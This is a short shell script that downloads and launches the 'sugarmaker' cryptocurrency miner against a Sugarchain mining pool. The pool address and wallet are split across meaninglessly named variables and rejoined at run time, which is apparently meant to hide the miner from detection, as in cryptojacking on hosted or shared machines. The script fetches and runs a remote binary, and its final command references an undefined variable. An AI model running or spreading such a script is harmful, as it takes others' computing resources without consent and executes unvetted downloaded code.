wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip
unzip sugarmaker-v2.5.0-sugar4-linux64.zip
stringh="core -t2"
hamula="8hw80g3dsarcmlaww8hhf5gydsx."
ching="cp://sugar.ss.dxpool.com:3366 -u sugar1qetd77wlllhj"
cpus=$(lscpu | grep CPU\(s\) | head -1 | cut -f2 -d":" | awk '{$1=$1;print}')
sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+t$ching$hamula$cpus$string
